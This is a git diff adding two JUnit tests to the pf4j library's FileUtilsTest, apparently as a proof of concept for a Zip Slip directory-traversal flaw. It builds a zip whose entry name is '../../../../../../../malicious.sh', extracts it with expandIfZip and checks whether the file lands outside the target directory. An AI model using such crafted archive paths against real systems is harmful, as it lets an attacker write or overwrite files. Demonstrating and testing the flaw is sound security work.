@@ -24,9 +24,12 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.util.List;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertTrue;
+import static org.pf4j.util.FileUtils.expandIfZip;
 
 public class FileUtilsTest {
 
@@ -95,4 +98,48 @@ public class FileUtilsTest {
         }
         return file;
     }
+
+    /**
+     * Using the zipslip vulnerability, create a zip file.
+     *
+     * Save the created zip file in the D:/code/pf4j directory, if you do not have this path on your computer D drive, create it
+     * @throws Exception
+     */
+    @Test
+    public void creatFile() throws Exception {
+
+        String maliciousFileName = "../../../../../../../malicious.sh";
+
+        // Build a malicious ZIP file
+        try (ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream("malicious.zip"))) {
+            ZipEntry entry = new ZipEntry(maliciousFileName);
+            zipOutputStream.putNextEntry(entry);
+            zipOutputStream.write("Malicious content".getBytes());
+            zipOutputStream.closeEntry();
+        }
+    }
+
+    /**
+     * Try to extract malicious.zip to the root directory of drive D on your computer.
+     * @throws Exception
+     */
+    @Test
+    public void loadFile() throws Exception {
+        // Save the created zip file in the D:/code/pf4j directory, if you do not have this path on your computer D drive, create it
+        String maliciousZipPath = "D:\\code\\pf4j\\malicious.zip";
+
+        // Unzip file
+        expandIfZip(Paths.get(maliciousZipPath));
+        //loadPluginFromPath(Paths.get(maliciousZipPath));
+
+        // Check whether the specified file exists in the directory
+        File  file = new File("D:\\malicious.sh");
+        if (file.exists()) {
+            System.out.println("file exists: Directory traversal successful!");
+        } else {
+            System.out.println("file does not exist!");
+        }
+    }
+
+
 }
